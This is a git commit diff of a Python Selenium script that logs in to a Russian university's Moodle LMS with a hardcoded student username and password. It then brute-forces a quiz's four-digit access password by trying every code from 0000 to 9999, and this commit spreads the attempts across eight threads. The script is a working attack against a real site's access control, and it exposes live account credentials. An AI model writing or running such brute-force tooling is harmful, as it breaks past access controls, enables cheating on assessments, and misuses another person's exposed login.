3630acc5b2004c3bc1590227cf72e84bfec9fcd4
igor <igor.raz@list.ru>
2022-12-24 17:06:44 +0300

    second

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
+from threading import *
 import time
 
 myarray = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
@@ -14,43 +15,57 @@ def myfunc(myarray, number):
                 for s4 in myarray:
                     newarray.append(s1 + s2 + s3 + s4)
     return newarray
+z = myfunc(myarray, number)
 
+def sel(*k):
+    s = k
+    print(*s)#просмотр элементов
+    options = webdriver.ChromeOptions()
+    options.add_argument("user-agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0")
+    driver = webdriver.Chrome(
+        executable_path="/home/cain/PycharmProject/selenium_python/chromedriver/chromedriver",
+        options=options
+    )
 
-s = myfunc(myarray, number)
+    # вход на сайт
+    driver.get("https://lms.mtuci.ru/lms/login/index.php")
+    time.sleep(1)
+    log = driver.find_element("id", "username")
+    log.clear()
+    log.send_keys('1bvt21167')
+    time.sleep(1)
+    pas = driver.find_element("id", "password")
+    pas.clear()
+    pas.send_keys('костяванлав1')
+    driver.find_element("id", "loginbtn").click()
+    time.sleep(1)
 
-options = webdriver.ChromeOptions()
-options.add_argument("user-agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0")
-driver = webdriver.Chrome(
-    executable_path="/home/cain/PycharmProject/selenium_python/chromedriver/chromedriver",
-    options=options
-)
+    # вход на тест
+    driver.get("https://lms.mtuci.ru/lms/mod/quiz/view.php?id=61613")
+    time.sleep(1)
+    driver.find_element(By.XPATH, '//button[text()="Начать тестирование"]').click()
+    time.sleep(1)
 
-driver.get("https://lms.mtuci.ru/lms/login/index.php")
-time.sleep(1)
-log = driver.find_element("id", "username")
-log.clear()
-log.send_keys('1bvt21167')
-time.sleep(1)
-pas = driver.find_element("id", "password")
-pas.clear()
-pas.send_keys('костяванлав1')
-driver.find_element("id", "loginbtn").click()
-time.sleep(1)
-
-driver.get("https://lms.mtuci.ru/lms/mod/quiz/view.php?id=63151")
-time.sleep(1)
-driver.find_element(By.XPATH, '//button[text()="Начать тестирование"]').click()
-time.sleep(1)
-
-pas = driver.find_element("id", "id_quizpassword")
-pas.clear()
-pas.send_keys('0000')
-driver.find_element("id", "id_submitbutton").click()
-time.sleep(5)
-
-for i in range(1, len(s)):
+    # ввод первого пароля
     pas = driver.find_element("id", "id_quizpassword")
     pas.clear()
-    pas.send_keys(s[i])
+    pas.send_keys('0000')
     driver.find_element("id", "id_submitbutton").click()
-    print(s[i])
+    time.sleep(5)
+
+    for i in range(1, len(s)):
+        try:
+            pas = driver.find_element("id", "id_quizpassword")
+            pas.clear()
+            pas.send_keys(s[i])
+            driver.find_element("id", "id_submitbutton").click()
+            print(s[i])
+        except:
+            print(s[i])
+            exit(0)
+
+
+for i in range(8):
+    tmp = 8
+    th = Thread(target=sel, name=("th-{}".format(i)), args=(z[1+int((len(z)-1)/tmp*i):len(z)-1+int((len(z)-1)/tmp*i):],))
+    th.start()
